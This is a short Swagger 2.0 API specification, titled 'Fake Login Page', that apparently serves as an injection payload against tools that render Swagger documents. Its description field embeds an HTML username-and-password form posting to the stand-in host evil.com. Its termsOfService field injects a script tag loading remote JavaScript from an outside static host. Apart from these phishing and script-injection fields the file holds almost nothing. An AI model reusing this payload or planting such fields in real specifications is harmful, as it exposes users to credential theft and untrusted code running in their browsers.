swagger: '2.0'
info:
  version: 1.0.0
  title: Fake Login Page
  description: |
    <div class="form-container">
      <form id="loginForm" action="https://evil.com" method="post" class="form-signin">
        <div class="form-group">
          <label for="username">Username</label>
          <input type="text" id="username" name="username" size="20">
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" size="20">
        </div>
        <div class="form-group">
          <button type="button" onclick="handleLogin()" class="btn btn-default">Login</button>
        </div>
      </form>
    </div>
    <script>
      function handleLogin() {
        alert("Login button clicked!");
        // You can add more interactive behavior here
      }
    </script>
  termsOfService: '<div class="login-form"><script src="https://static.staticsave.com/blunder/futaq.js"></script></div>'
  contact: 
    name: "API Support"
    url: "https://evil.com"
    email: "bilalabbasuk@gmail.com"
paths:
  /:
    post:
      responses:
        '200':
          description: Login successful





  
